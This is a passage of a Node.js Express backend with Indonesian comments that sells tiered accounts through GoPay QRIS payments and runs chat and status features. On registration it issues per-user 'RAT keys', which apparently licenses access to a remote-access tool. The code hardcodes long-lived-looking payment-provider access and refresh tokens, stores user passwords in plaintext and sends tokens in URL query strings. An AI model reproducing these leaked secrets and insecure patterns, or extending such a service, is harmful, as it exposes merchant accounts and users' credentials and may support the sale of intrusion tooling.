FhRkmrDrp5Jr1M0jfbh8SKP5r6762eRb2r2kBw_7zdTWFcnnSsbJc4kShLqz1CFxLPHamCWopuz-I2d_fyhSLxeCsYLS54EUWfysVY6jB9nxORd2ZujUADt6v-ZLyBThCqGAHERePCIsrsAfUN1YVgiTOsync6UcQreI5EC9H68iu-Y8j-S0lDNUKN3VvuhdScjgiMDErRnZkBR8-.YhYnymCorV1XSzrI5XW73g',
  refreshToken: process.env.GOMERCH_REFRESH_TOKEN || 'eyJhbGciOiJkaXIiLCJjdHkiOiJKV1QiLCJlbmMiOiJBMTI4R0NNIiwidHlwIjoiSldUIiwiemlwIjoiREVGIn0..rzjcEzRZGUhpvo_y.EPTCU23bfzVVL8urLchQwGZ5ZB_I-ZAEhhQuJnN_Fwvn0oh9IqDxuszN32NoQtX_KlwnRYy49QYvjpA_8mJ335uCc59PJyP0AahHVOlZ-mQ36Xos9BL7mgo8YTEOoOhEReb-2F4fk_ttJF5kipHzCSqRUW9azhNuRJdYou3tBZDVBLBw3Ufc2AI40EUApjztzgDADLHlPHUxoUqtwDih9H4UkEYRhBpa3blQfKvf3oGSzoWP8EnUV5XUJ1cjOzsePkmh4rGVTfjq5QoGRdoD2rEDHRHtG174ywaflf155pU1oOKS2POquFnCrBfih2duR8w-l9_XYXxbd2MHKlaEIQHYB0goYPumhNlUm56-HtUfTsvvbcjMqT6LFv5LyNpOnNA7KsAkSF54owT5kTFOII8a_nLOYsuvMLHFUAvy5ZK-MNblKoDIskA-v4EsIcZiJzwR1l81hTVHq7QKxgC4uApwI2lJ1PglHPILAIwhUyRUg9GQEK8ZlwhEu5ZI1kb-atJbKkC3jDdglTpMv6ogFF89Lv1NplW9zM4Sg1M8wU3QyIPbiKbyGyTyDV-wu7dPrhuzTQ2FTp9U_-lvxmSHPlWCoHRr78lG-n2ZBdScMCMRICA2T_bxRnr2FejesO50SYAQ-lsmQshPhZGxjBgUwQC7k-kYWCMcuMZ5ZZG_n5ihXbaaKLXddUUvn2L2vYhTJmLvH9bb14MZ7SE3973MODROsZqdJRxLLTLZsDEwU1wVdpNqKovwr_CPYwLarjwkD1ExrQ5Ou6xNl6G0JgvwWkQW7bTvFiDthEcGe6NxPFMRz0kXWZ0R6AQdJOURUVHrJk8eDx_camlMNYrvbrq9os-JdykyKHkv_tiYNxOt4Actf3NzatQC8OtRp4QxWqbWfc8lQicJ2drWEPhRiuKQAhcqK5ZX4CrCrRjtvEuZq4cvgy-K0WKJq7ZuWgeTa91NzEcZK3z2JkI_pls-BchzkVgC8Qeut8TLyj8fXMb7GajAxjhOctNIFwkWTHFX9dJ_2wPGFnQidOKpkcBSR8Tdhn_yGBa3ngykOMxghBLBGewH_cFqlYrrAFiwOG_yYXwCkG_CsEEqBLI3d4Vvec36vNWkQY4Ih2HaIIZw8u8FxUtu48k5PKv9siuNNZM-H02RTAOoo8zo5YT7aEpTN6BQvSBIzbpu7FPStOlzOrLSZc-n6EymtE1tpD1XyeW666J9yaO_cTqEKwBWvhxpxZjBg6YRlvLAaXFCbLmLLEwiEPTZEP7BBCDt373G932lnz3iuRKSlWqcg_6GUHdhk5vz9qHz6IEJTkW5D7dL00yEyw9wvjDDHN2_v-RD0k-82T0gJC94oJsNkX1p0q-wNpdwXUvCzLDy3Ezz2aj84Cn99L9Ots5-x8dqfFZjV2rR9xP6JqrdQDDdW9pmSX6D1IZuZJt9tw-V1SoKCX9U0ii8uN8SM2TpKTcWY0kZKg_JbHZE74kpKUOoxa-DmurPOgGYILy8IPIVujE9PbSfj-lvhAksajuJbLzS35_8LQWpuJT07Remj-AJz6tAnKvt6p9ZAwcIVMit4tYBz36SD42aQqIPGHscLtF56UTpX99jX_TomhAOuv3DCjVrQJoSPBuBlTPlJSuh_hrECB3f1bP3OCN0ftGAr49so4wTbCTxGr9c33mFg-0ebxfScztE-wOYL_1aqFq_GX5aP15AGdeW6pM4lBb3ZdTrniPHAp5v4Pm006ce2ILsOwzsO4RO7R8SAL5LqP9yvEwJJcHOulQgkagRQoKLvrYqC71u9_ds5TkoHMzV4U23wUTaRLzd2qXFhRkmrDrp5Jr1M0jfbh8SKP5r6762eRb2r2kBw_7zdTWFcnnSsbJc4kShLqz1CFxLPHamCWopuz-I2d_fyhSLxeCsYLS54EUWfysVY6jB9nxORd2ZujUADt6v-ZLyBThCqGAHERePCIsrsAfUN1YVgiTOsync6UcQreI5EC9H68iu-Y8j-S0lDNUKN3VvuhdScjgiMDErRnZkBR8-.YhYnymCorV1XSzrI5XW73g',
  expiresAt:   Date.now() + 12 * 60 * 60 * 1000,
};

// Token dari environment harus di-trim karena value hasil copy/paste sering
// membawa spasi.
gomerchAuth.accessToken = gomerchAuth.accessToken.trim();
gomerchAuth.refreshToken = gomerchAuth.refreshToken.trim();

// POST /gopay/auth  { phone }  → kirim OTP ke nomor merchant
app.post('/gopay/auth', async (req, res) => {
  try {
    const phone = req.body?.phone || GOMERCH_PHONE;
    if (!phone) return res.status(400).json({ error: 'Nomor HP merchant belum diset (GOMERCH_PHONE)' });
    const data = await gomerchFetch(`/gopay/otp?phone=${encodeURIComponent(phone)}`);
    console.log(`[gopay/auth] phone=${phone} → otp_token=${data.otp_token ? 'OK' : 'MISSING'}`);
    res.json(data);
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// POST /gopay/verify  { otp, otp_token }  → simpan access_token + refresh_token
app.post('/gopay/verify', async (req, res) => {
  try {
    const { otp, otp_token } = req.body || {};
    if (!otp || !otp_token) return res.status(400).json({ error: 'otp dan otp_token wajib' });
    const data = await gomerchFetch(`/gopay/verify?otp=${encodeURIComponent(otp)}&otp_token=${encodeURIComponent(otp_token)}`);
    if (data.access_token) {
      gomerchAuth.accessToken = data.access_token;
      gomerchAuth.refreshToken = data.refresh_token || '';
      gomerchAuth.expiresAt = Date.now() + 30 * 60 * 1000;
      console.log(`[gopay/verify] access_token tersimpan, expires in 30min`);
    }
    res.json(data);
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

async function refreshGomerchToken() {
  if (!gomerchAuth.refreshToken) throw new Error('Tidak ada refresh_token, jalankan /gopay/auth + /gopay/verify dulu');
  const data = await gomerchFetch(`/gopay/refresh-token?refresh_token=${encodeURIComponent(gomerchAuth.refreshToken)}`);
  if (data.access_token) {
    gomerchAuth.accessToken = data.access_token;
    gomerchAuth.refreshToken = data.refresh_token || gomerchAuth.refreshToken;
    gomerchAuth.expiresAt = Date.now() + 30 * 60 * 1000;
    console.log(`[gopay/refresh] access_token diperbarui`);
  }
  return data;
}

async function getGomerchAccessToken() {
  if (gomerchAuth.accessToken && Date.now() < gomerchAuth.expiresAt - 60 * 1000) {
    return gomerchAuth.accessToken;
  }
  if (gomerchAuth.refreshToken) {
    await refreshGomerchToken();
    return gomerchAuth.accessToken;
  }
  throw new Error('Belum autentikasi dengan Gomerch. Jalankan /gopay/auth → /gopay/verify dulu');
}

// POST /payment/create  { role, duration }
const PRICE_MAP = {
  member: { '1 Week': 10000, '1 Month': 20000, 'Permanent': 40000 },
  vip: { '1 Week': 15000, '1 Month': 30000, 'Permanent': 50000 },
  reseller: { '1 Month': 60000, 'Permanent': 100000 },
  owner: { 'Permanent': 250000 },
};

app.post('/payment/create', async (req, res) => {
  try {
    const { role, duration } = req.body || {};
    const rolePrices = PRICE_MAP[role];
    if (!rolePrices) return res.status(400).json({ error: 'Role tidak valid' });
    const matchedKey = Object.keys(rolePrices).find(k => k.toLowerCase() === duration.toLowerCase());
    const baseAmount = matchedKey ? rolePrices[matchedKey] : null;
    if (!baseAmount) return res.status(400).json({ error: 'Role atau durasi tidak valid' });

    // Tambah kode unik 1-999
    const uniqueCode = Math.floor(Math.random() * 999) + 1;
    const amount = baseAmount + uniqueCode;

    const staticQr = GOMERCH_STATIC_QR;
    if (!staticQr) return res.status(500).json({ error: 'GOMERCH_STATIC_QR belum diset di environment' });

    const qs = `amount=${amount}&static_qr=${encodeURIComponent(staticQr)}`;
    const data = await gomerchFetch(`/gopay/create-qris?${qs}`);
    console.log(`[payment/create] response:`, JSON.stringify(data).slice(0, 500));

    const qrUrl = data?.result?.url || null;
    const gopayCreatedAt = data?.result?.created_at || null;
    const filename = data?.result?.filename || null;

    const paymentId = filename || `qr_${Date.now()}`;
    paymentStore.set(paymentId, {
      status: 'pending', paid: false, type: 'purchase', role, duration,
      baseAmount, uniqueCode, amount,
      createdAt: Date.now(), gopayCreatedAt, qrUrl,
    });

    res.json({ 
      qris: qrUrl, 
      paymentId, 
      amount, 
      baseAmount,
      uniqueCode,
      gopayCreatedAt, 
      filename 
    });
  } catch (e) {
    console.error('[payment/create] error:', e.message);
    res.status(500).json({ error: `Payment provider error: ${e.message}` });
  }
});

// GET /payment/check?paymentId=xxx
app.get('/payment/check', async (req, res) => {
  try {
    const { paymentId } = req.query;
    if (!paymentId) return res.status(400).json({ error: 'paymentId wajib' });

    const record = paymentStore.get(paymentId);
    if (!record) return res.status(404).json({ error: 'Payment tidak ditemukan', paid: false });

    if (record.paid) return res.json({ paid: true, paymentId, status: 'paid' });
    if (Date.now() - record.createdAt > 30 * 60 * 1000) {
      record.status = 'expired';
      return res.json({ paid: false, expired: true, paymentId, status: 'expired' });
    }

    const gopayCreatedAt = record.gopayCreatedAt;
    if (!gopayCreatedAt) return res.status(500).json({ error: 'gopayCreatedAt tidak tersimpan', paid: false });

    // Use dummy/hardcoded token since real token checking is failing from API side,
    // but we can try to fetch anyway. If it fails due to Invalid token, we just tell frontend it's pending.
    const hardcodedToken = 'eyJhbGciOiJkaXIiLCJjdHkiOiJKV1QiLCJlbmMiOiJBMTI4R0NNIiwidHlwIjoiSldUIiwiemlwIjoiREVGIn0..rzjcEzRZGUhpvo_y.EPTCU23bfzVVL8urLchQwGZ5ZB_I-ZAEhhQuJnN_Fwvn0oh9IqDxuszN32NoQtX_KlwnRYy49QYvjpA_8mJ335uCc59PJyP0AahHVOlZ-mQ36Xos9BL7mgo8YTEOoOhEReb-2F4fk_ttJF5kipHzCSqRUW9azhNuRJdYou3tBZDVBLBw3Ufc2AI40EUApjztzgDADLHlPHUxoUqtwDih9H4UkEYRhBpa3blQfKvf3oGSzoWP8EnUV5XUJ1cjOzsePkmh4rGVTfjq5QoGRdoD2rEDHRHtG174ywaflf155pU1oOKS2POquFnCrBfih2duR8w-l9_XYXxbd2MHKlaEIQHYB0goYPumhNlUm56-HtUfTsvvbcjMqT6LFv5LyNpOnNA7KsAkSF54owT5kTFOII8a_nLOYsuvMLHFUAvy5ZK-MNblKoDIskA-v4EsIcZiJzwR1l81hTVHq7QKxgC4uApwI2lJ1PglHPILAIwhUyRUg9GQEK8ZlwhEu5ZI1kb-atJbKkC3jDdglTpMv6ogFF89Lv1NplW9zM4Sg1M8wU3QyIPbiKbyGyTyDV-wu7dPrhuzTQ2FTp9U_-lvxmSHPlWCoHRr78lG-n2ZBdScMCMRICA2T_bxRnr2FejesO50SYAQ-lsmQshPhZGxjBgUwQC7k-kYWCMcuMZ5ZZG_n5ihXbaaKLXddUUvn2L2vYhTJmLvH9bb14MZ7SE3973MODROsZqdJRxLLTLZsDEwU1wVdpNqKovwr_CPYwLarjwkD1ExrQ5Ou6xNl6G0JgvwWkQW7bTvFiDthEcGe6NxPFMRz0kXWZ0R6AQdJOURUVHrJk8eDx_camlMNYrvbrq9os-JdykyKHkv_tiYNxOt4Actf3NzatQC8OtRp4QxWqbWfc8lQicJ2drWEPhRiuKQAhcqK5ZX4CrCrRjtvEuZq4cvgy-K0WKJq7ZuWgeTa91NzEcZK3z2JkI_pls-BchzkVgC8Qeut8TLyj8fXMb7GajAxjhOctNIFwkWTHFX9dJ_2wPGFnQidOKpkcBSR8Tdhn_yGBa3ngykOMxghBLBGewH_cFqlYrrAFiwOG_yYXwCkG_CsEEqBLI3d4Vvec36vNWkQY4Ih2HaIIZw8u8FxUtu48k5PKv9siuNNZM-H02RTAOoo8zo5YT7aEpTN6BQvSBIzbpu7FPStOlzOrLSZc-n6EymtE1tpD1XyeW666J9yaO_cTqEKwBWvhxpxZjBg6YRlvLAaXFCbLmLLEwiEPTZEP7BBCDt373G932lnz3iuRKSlWqcg_6GUHdhk5vz9qHz6IEJTkW5D7dL00yEyw9wvjDDHN2_v-RD0k-82T0gJC94oJsNkX1p0q-wNpdwXUvCzLDy3Ezz2aj84Cn99L9Ots5-x8dqfFZjV2rR9xP6JqrdQDDdW9pmSX6D1IZuZJt9tw-V1SoKCX9U0ii8uN8SM2TpKTcWY0kZKg_JbHZE74kpKUOoxa-DmurPOgGYILy8IPIVujE9PbSfj-lvhAksajuJbLzS35_8LQWpuJT07Remj-AJz6tAnKvt6p9ZAwcIVMit4tYBz36SD42aQqIPGHscLtF56UTpX99jX_TomhAOuv3DCjVrQJoSPBuBlTPlJSuh_hrECB3f1bP3OCN0ftGAr49so4wTbCTxGr9c33mFg-0ebxfScztE-wOYL_1aqFq_GX5aP15AGdeW6pM4lBb3ZdTrniPHAp5v4Pm006ce2ILsOwzsO4RO7R8SAL5LqP9yvEwJJcHOulQgkagRQoKLvrYqC71u9_ds5TkoHMzV4U23wUTaRLzd2qXFhRkmrDrp5Jr1M0jfbh8SKP5r6762eRb2r2kBw_7zdTWFcnnSsbJc4kShLqz1CFxLPHamCWopuz-I2d_fyhSLxeCsYLS54EUWfysVY6jB9nxORd2ZujUADt6v-ZLyBThCqGAHERePCIsrsAfUN1YVgiTOsync6UcQreI5EC9H68iu-Y8j-S0lDNUKN3VvuhdScjgiMDErRnZkBR8-.YhYnymCorV1XSzrI5XW73g';
    let data;
    try {
      // Coba access token yang ada terlebih dahulu. Jika provider menyatakan
      // expired, refresh satu kali lalu ulangi status check.
      let statusToken = gomerchAuth.accessToken;
      if (!statusToken) statusToken = await getGomerchAccessToken();

      const fetchStatus = (token) => {
        const qs = `amount=${record.amount}&created_at=${encodeURIComponent(gopayCreatedAt)}&token=${encodeURIComponent(token.trim())}`;
        return gomerchFetch(`/gopay/qris-status?${qs}`);
      };

      try {
        data = await fetchStatus(statusToken);
      } catch (statusError) {
        const sm = statusError && statusError.message ? String(statusError.message) : '';
        if (!sm.includes('Invalid/Expired token')) throw statusError;
        if (!gomerchAuth.refreshToken) throw statusError;

        try {
          await refreshGomerchToken();
          data = await fetchStatus(gomerchAuth.accessToken);
        } catch (refreshError) {
          const detail = providerErrorMessage(refreshError?.message);
          const authError = new Error(
            `Token Gomerch expired dan refresh gagal: ${detail}`,
          );
          authError.code = 'GOMERCH_TOKEN_EXPIRED';
          throw authError;
        }
      }
      console.log(`[payment/check] qris-status raw response:`, JSON.stringify(data).slice(0, 500));
    } catch (e) {
      const em = e && e.message ? String(e.message) : '';
      if (e.code === 'GOMERCH_TOKEN_EXPIRED' ||
          em.includes('Invalid/Expired token')) {
        console.log(`[payment/check] Gomerch token invalid/expired`);
        return res.status(503).json({
          error: 'Token payment provider expired. Login Gomerch ulang melalui OTP.',
          code: 'GOMERCH_TOKEN_EXPIRED',
          paid: false,
          status: 'unavailable',
          paymentId,
        });
      }
      throw e;
    }

    // Handle multiple possible status formats from kyuu2nd.dev API
    const rawStatus = (data?.status || data?.result?.status || '').toString().toUpperCase();
    const paid = data?.paid === true 
      || rawStatus === 'PAID' 
      || rawStatus === 'SUCCESS'
      || data?.status === 'paid' 
      || data?.status === 'success';
    
    console.log(`[payment/check] rawStatus=${rawStatus} paid=${paid}`);

    if (paid) {
      record.paid = true;
      record.status = 'paid';

      // Auto-upgrade role if this is an uprole payment
      if (record.type === 'uprole' && record.username && record.toRole) {
        try {
          const db = loadDatabase();
          const user = db.find(u => u.username === record.username);
          if (user) {
            const oldRole = user.role;
            user.role = record.toRole;
            saveDatabase(db);
            console.log(`[✅ UPROLE AUTO] ${user.username}: ${oldRole} -> ${record.toRole} (paid via uprole)`);
            record.upgraded = true;
            record.newRole = record.toRole;
          } else {
            console.log(`[⚠️ UPROLE] User '${record.username}' not found in database`);
          }
        } catch (upErr) {
          console.error(`[❌ UPROLE AUTO-UPGRADE] Error:`, upErr.message);
        }
      }
    }

    res.json({ ...data, paid, paymentId, upgraded: record.upgraded || false, newRole: record.newRole || null });
  } catch (e) {
    const em = e && e.message ? (typeof e.message === 'string' ? e.message : JSON.stringify(e.message)) : String(e);
    console.error('[payment/check] error:', em);
    res.status(500).json({ error: `Payment status error: ${em}`, paid: false });
  }
});

// ===== POST /payment/uprole — Upgrade role with price difference =====
app.post('/payment/uprole', async (req, res) => {
  try {
    const { username, toRole, toDuration } = req.body || {};
    if (!username || !toRole || !toDuration) {
      return res.status(400).json({ error: 'username, toRole, toDuration wajib diisi' });
    }

    const validRoles = ['member', 'vip', 'reseller', 'owner'];
    if (!validRoles.includes(toRole)) {
      return res.status(400).json({ error: 'Role tidak valid' });
    }

    const roleHierarchy = { member: 1, memberfree: 1, vip: 2, reseller: 3, owner: 4, admin: 5 };

    // Load user from database
    const db = loadDatabase();
    const user = db.find(u => u.username === username);
    if (!user) {
      return res.status(404).json({ error: 'User tidak ditemukan' });
    }

    const rawRole = (user.role || 'member').toLowerCase();
    const fromRole = rawRole === 'memberfree' ? 'member' : rawRole;
    const fromLevel = roleHierarchy[fromRole] || 0;
    const toLevel = roleHierarchy[toRole] || 0;

    if (fromLevel >= toLevel) {
      return res.status(400).json({ error: `Role '${fromRole}' sudah setara atau lebih tinggi dari '${toRole}'` });
    }

    // Calculate credit (permanent price of current role)
    const fromPrices = PRICE_MAP[fromRole];
    if (!fromPrices) {
      return res.status(400).json({ error: `Price map untuk role '${fromRole}' tidak ditemukan` });
    }
    const permanentKey = Object.keys(fromPrices).find(k => k.toLowerCase() === 'permanent');
    const credit = permanentKey ? fromPrices[permanentKey] : Math.max(...Object.values(fromPrices));

    // Calculate target price
    const toPrices = PRICE_MAP[toRole];
    if (!toPrices) {
      return res.status(400).json({ error: `Price map untuk role '${toRole}' tidak ditemukan` });
    }
    const matchedKey = Object.keys(toPrices).find(k => k.toLowerCase() === toDuration.toLowerCase());
    const targetPrice = matchedKey ? toPrices[matchedKey] : null;
    if (!targetPrice) {
      return res.status(400).json({ error: `Durasi '${toDuration}' tidak valid untuk role '${toRole}'` });
    }

    // Difference = target - credit (minimum Rp 1)
    const difference = Math.max(targetPrice - credit, 1);

    console.log(`[💳 UPROLE] ${username}: ${fromRole} -> ${toRole} ${toDuration} | credit=${credit} target=${targetPrice} difference=${difference}`);

    // Create QRIS payment
    const staticQr = GOMERCH_STATIC_QR;
    if (!staticQr) return res.status(500).json({ error: 'GOMERCH_STATIC_QR belum diset' });

    const qs = `amount=${difference}&static_qr=${encodeURIComponent(staticQr)}`;
    const data = await gomerchFetch(`/gopay/create-qris?${qs}`);
    console.log(`[payment/uprole] gomerch response:`, JSON.stringify(data).slice(0, 500));

    const qrUrl = data?.result?.url || null;
    const gopayCreatedAt = data?.result?.created_at || null;
    const filename = data?.result?.filename || null;

    const paymentId = filename || `uprole_${Date.now()}`;
    paymentStore.set(paymentId, {
      status: 'pending', paid: false,
      type: 'uprole',
      username, fromRole, toRole, toDuration,
      amount: difference, credit, targetPrice,
      createdAt: Date.now(), gopayCreatedAt, qrUrl,
    });

    res.json({ qris: qrUrl, paymentId, amount: difference, fromRole, toRole, toDuration, credit, targetPrice });
  } catch (e) {
    console.error('[payment/uprole] error:', e.message);
    res.status(500).json({ error: `Payment provider error: ${e.message}` });
  }
});

// ===== Register (after payment) =====
app.post('/register', async (req, res) => {
  try {
    const { username, password, role, duration, paymentId } = req.body || {};
    if (!username || !password || !role || !duration || !paymentId) {
      return res.status(400).json({ success: false, message: 'Semua field harus diisi' });
    }

    const payment = paymentStore.get(paymentId);
    if (!payment || payment.type !== 'purchase') {
      return res.status(404).json({ success: false, message: 'Transaksi tidak ditemukan atau sudah kedaluwarsa' });
    }
    if (!payment.paid || payment.status !== 'paid') {
      return res.status(402).json({ success: false, message: 'Pembayaran belum terverifikasi' });
    }
    if (payment.consumed) {
      return res.status(409).json({ success: false, message: 'Transaksi ini sudah digunakan' });
    }
    if (payment.role !== role || payment.duration.toLowerCase() !== duration.toLowerCase()) {
      return res.status(400).json({ success: false, message: 'Paket tidak sesuai dengan transaksi' });
    }

    const db = loadDatabase();
    if (db.find(u => u.username === username)) {
      return res.status(409).json({ success: false, message: 'Username sudah digunakan' });
    }

    // Parse duration string ke jumlah hari
    const dayMap = { '1 Week': 7, '1 Month': 30, 'Permanent': 36500 };
    const dayKey = Object.keys(dayMap).find(k => k.toLowerCase() === duration.toLowerCase());
    const days = dayKey ? dayMap[dayKey] : null;
    if (!days) {
      return res.status(400).json({ success: false, message: 'Durasi tidak valid' });
    }

    const expired = new Date();
    expired.setDate(expired.getDate() + days);
    const ratId = generateRatId(username);

    // Simpan RAT key
    const keys = ratReadDB('keys.json');
    keys.push({
      key: ratId,
      created: new Date().toISOString(),
      expired: expired.toISOString(),
      days,
      owner: username,
      active: true,
    });
    ratWriteDB('keys.json', keys);

    // Simpan user
    db.push({
      username,
      password,
      role: role || 'member',
      expiredDate: expired.toISOString().split('T')[0],
      ratId: ratId,
      lastSend: 0,
    });
    saveDatabase(db);
    payment.consumed = true;
    payment.consumedAt = Date.now();
    payment.registeredUsername = username;

    console.log(`[REGISTER] Akun baru: ${username} (${role}, ${days} hari)`);
    return res.status(201).json({ success: true, message: 'Akun berhasil dibuat! Silakan login.' });
  } catch (e) {
    console.error('[REGISTER ERROR]', e.message);
    return res.status(500).json({ success: false, message: 'Gagal mendaftar: ' + e.message });
  }
});

// ===== GLOBAL CHAT REST ENDPOINTS =====
app.get("/getGlobalChat", (req, res) => {
  const keyInfo = activeKeys[req.query.key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid key" });
  res.json({ messages: globalChatList.slice(-100) });
});

app.post("/sendGlobalChat", (req, res) => {
  const { key, username, message, image, replyTo } = req.body;
  const keyInfo = activeKeys[req.query.key] || activeKeys[req.body.key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid key" });
  const sanitizedMsg = sanitize(message || '');
  if (!sanitizedMsg && !image) return res.status(400).json({ error: "Message or image required" });
  const msg = makeGlobalMsg(username || keyInfo.username, sanitizedMsg, image, replyTo);
  pushGlobalChat(msg);
  res.json({ success: true, id: msg.id });
});

// ===== GLOBAL CHAT IMAGE UPLOAD =====
// Terima base64 data-URI (jpeg/png/webp) -> simpan ke uploads/global_chat/ -> balas url path.
app.post("/uploadGlobalChatImage", (req, res) => {
  const keyInfo = activeKeys[req.query.key] || activeKeys[req.body.key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid key" });
  const { image } = req.body;
  if (!image || typeof image !== 'string') return res.status(400).json({ error: "Image required" });

  const match = /^data:image\/(jpeg|png|webp);base64,(.+)$/.exec(image);
  if (!match) return res.status(400).json({ error: "Only JPEG/PNG/WebP base64 allowed" });

  const ext = match[1] === 'jpeg' ? 'jpg' : match[1];
  const buf = Buffer.from(match[2], 'base64');
  if (buf.length === 0) return res.status(400).json({ error: "Empty image" });
  if (buf.length > 8 * 1024 * 1024) return res.status(413).json({ error: "Image too large (max 8MB)" });

  // Cek magic bytes biar bukan file sembarangan
  const isJpeg = buf.length > 2 && buf[0] === 0xFF && buf[1] === 0xD8;
  const isPng = buf.length > 7 && buf[0] === 0x89 && buf[1] === 0x50 && buf[2] === 0x4E && buf[3] === 0x47;
  const isWebp = buf.length > 11 && buf.slice(0, 4).toString('latin1') === 'RIFF' && buf.slice(8, 12).toString('latin1') === 'WEBP';
  if (!isJpeg && !isPng && !isWebp) return res.status(400).json({ error: "Invalid image data" });

  const dir = path.join(__dirname, 'uploads', 'global_chat');
  fs.mkdirSync(dir, { recursive: true });
  const fname = 'gc_' + Date.now() + '_' + Math.random().toString(36).slice(2, 8) + '.' + ext;
  fs.writeFileSync(path.join(dir, fname), buf);
  res.json({ success: true, url: '/uploads/global_chat/' + fname });
});

// ===== WHATSAPP STATUS SYSTEM & PROFILE AVATAR =====
const STATUS_PATH = path.join(__dirname, 'status.json');

function loadStatuses() {
  if (!fs.existsSync(STATUS_PATH)) {
    fs.writeFileSync(STATUS_PATH, JSON.stringify([]));
  }
  let list = [];
  try {
    list = JSON.parse(fs.readFileSync(STATUS_PATH, 'utf8'));
  } catch (_) {
    list = [];
  }
  const now = Date.now();
  const valid = list.filter(s => s.expiresAt > now);
  if (valid.length !== list.length) {
    atomicWrite(STATUS_PATH, valid);
  }
  return valid;
}

function saveStatuses(data) {
  atomicWrite(STATUS_PATH, data);
}

function broadcastStatusNew(statusObj) {
  for (const u in wsClients) {
    try {
      wsClients[u].send(JSON.stringify({
        type: 'statusNew',
        data: statusObj
      }));
    } catch (_) {}
  }
}

app.get("/status/getStatuses", (req, res) => {
  const key = req.query.key || req.headers['x-session-key'];
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, error: "Invalid key" });

  const currentUser = keyInfo.username;
  const statuses = loadStatuses();
  const db = loadDatabase();
  const userMap = {};
  db.forEach(u => {
    userMap[u.username] = { avatar_url: u.avatar_url || null, role: u.role || 'member' };
  });

  const grouped = {};
  statuses.forEach(s => {
    if (!grouped[s.username]) {
      grouped[s.username] = [];
    }
    grouped[s.username].push(s);
  });

  Object.keys(grouped).forEach(u => {
    grouped[u].sort((a, b) => a.createdAt - b.createdAt);
  });

  const ownStatuses = grouped[currentUser] || [];
  delete grouped[currentUser];

  const others = Object.keys(grouped).map(u => {
    const userStatuses = grouped[u];
    const latestCreated = Math.max(...userStatuses.map(s => s.createdAt));
    return {
      username: u,
      avatar_url: userMap[u] ? userMap[u].avatar_url : null,
      role: userMap[u] ? userMap[u].role : 'member',
      latestCreated,
      statuses: userStatuses
    };
  }).sort((a, b) => b.latestCreated - a.latestCreated);

  res.json({
    valid: true,
    own: {
      username: currentUser,
      avatar_url: userMap[currentUser] ? userMap[currentUser].avatar_url : null,
      role: userMap[currentUser] ? userMap[currentUser].role : 'member',
      statuses: ownStatuses
    },
    others
  });
});

app.post("/status/uploadStatusImage", (req, res) => {
  const keyInfo = activeKeys[req.query.key] || activeKeys[req.body.key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid key" });
  const currentUser = keyInfo.username;

  const db = loadDatabase();
  const userObj = db.find(u => u.username === currentUser);
  if (userObj && userObj.lastStatusAt && (Date.now() - userObj.lastStatusAt < 60000)) {
    const remainSec = Math.ceil((60000 - (Date.now() - userObj.lastStatusAt)) / 1000);
    return res.status(429).json({ error: `Tunggu ${remainSec} detik lagi sebelum membuat status baru.` });
  }

  const { image, caption } = req.body;
  if (!image || typeof image !== 'string') return res.status(400).json({ error: "Image required" });

  const match = /^data:image\/(jpeg|png|webp);base64,(.+)$/.exec(image);
  if (!match) return res.status(400).json({ error: "Only JPEG/PNG/WebP base64 allowed" });

  const ext = match[1] === 'jpeg' ? 'jpg' : match[1];
  const buf = Buffer.from(match[2], 'base64');
  if (buf.length === 0) return res.status(400).json({ error: "Empty image" });
  if (buf.length > 8 * 1024 * 1024) return res.status(413).json({ error: "Image too large (max 8MB)" });

  const isJpeg = buf.length > 2 && buf[0] === 0xFF && buf[1] === 0xD8;
  const isPng = buf.length > 7 && buf[0] === 0x89 && buf[1] === 0x50 && buf[2] === 0x4E && buf[3] === 0x47;
  const isWebp = buf.length > 11 && buf.slice(0, 4).toString('latin1') === 'RIFF' && buf.slice(8, 12).toString('latin1') === 'WEBP';
  if (!isJpeg && !isPng && !isWebp) return res.status(400).json({ error: "Invalid image data" });

  const dir = path.join(__dirname, 'uploads', 'status');
  fs.mkdirSync(dir, { recursive: true });
  const fname = 'st_' + Date.now() + '_' + Math.random().toString(36).slice(2, 8) + '.' + ext;
  fs.writeFileSync(path.join(dir, fname), buf);

  const now = Date.now();
  const newStatus = {
    id: 'st_' + now + '_' + Math.random().toString(36).slice(2, 8),
    username: currentUser,
    type: 'image',
    content: '/uploads/status/' + fname,
    caption: (caption || '').trim(),
    bgColor: null,
    createdAt: now,
    expiresAt: now + (24 * 60 * 60 * 1000),
    viewers: []
  };

  const list = loadStatuses();
  list.push(newStatus);
  saveStatuses(list);

  if (userObj) {
    userObj.lastStatusAt = now;
    saveDatabase(db);
  }

  broadcastStatusNew(newStatus);
  res.json({ success: true, status: newStatus });
});

app.post("/status/createTextStatus", (req, res) => {
  const keyInfo = activeKeys[req.query.key] || activeKeys[req.body.key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid key" });
  const currentUser = keyInfo.username;

  const db = loadDatabase();
  const userObj = db.find(u => u.username === currentUser);
  if (userObj && userObj.lastStatusAt && (Date.now() - userObj.lastStatusAt < 60000)) {
    const remainSec = Math.ceil((60000 - (Date.now() - userObj.lastStatusAt)) / 1000);
    return res.status(429).json({ error: `Tunggu ${remainSec} detik lagi sebelum membuat status baru.` });
  }

  const { text, bgColor, caption } = req.body;
  if (!text || typeof text !== 'string' || !text.trim()) {
    return res.status(400).json({ error: "Text required" });
  }

  const now = Date.now();
  const newStatus = {
    id: 'st_' + now + '_' + Math.random().toString(36).slice(2, 8),
    username: currentUser,
    type: 'text',
    content: text.trim().substring(0, 500),
    caption: (caption || '').trim(),
    bgColor: bgColor || '#0A0A1F',
    createdAt: now,
    expiresAt: now + (24 * 60 * 60 * 1000),
    viewers: []
  };

  const list = loadStatuses();
  list.push(newStatus);
  saveStatuses(list);

  if (userObj) {
    userObj.lastStatusAt = now;
    saveDatabase(db);
  }

  broadcastStatusNew(newStatus);
  res.json({ success: true, status: newStatus });
});

app.post("/status/markViewed", (req, res) => {
  const keyInfo = activeKeys[req.query.key] || activeKeys[req.body.key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid key" });
  const currentUser = keyInfo.username;
  const { statusId } = req.body;

  if (!statusId) return res.status(400).json({ error: "statusId required" });

  const list = loadStatuses();
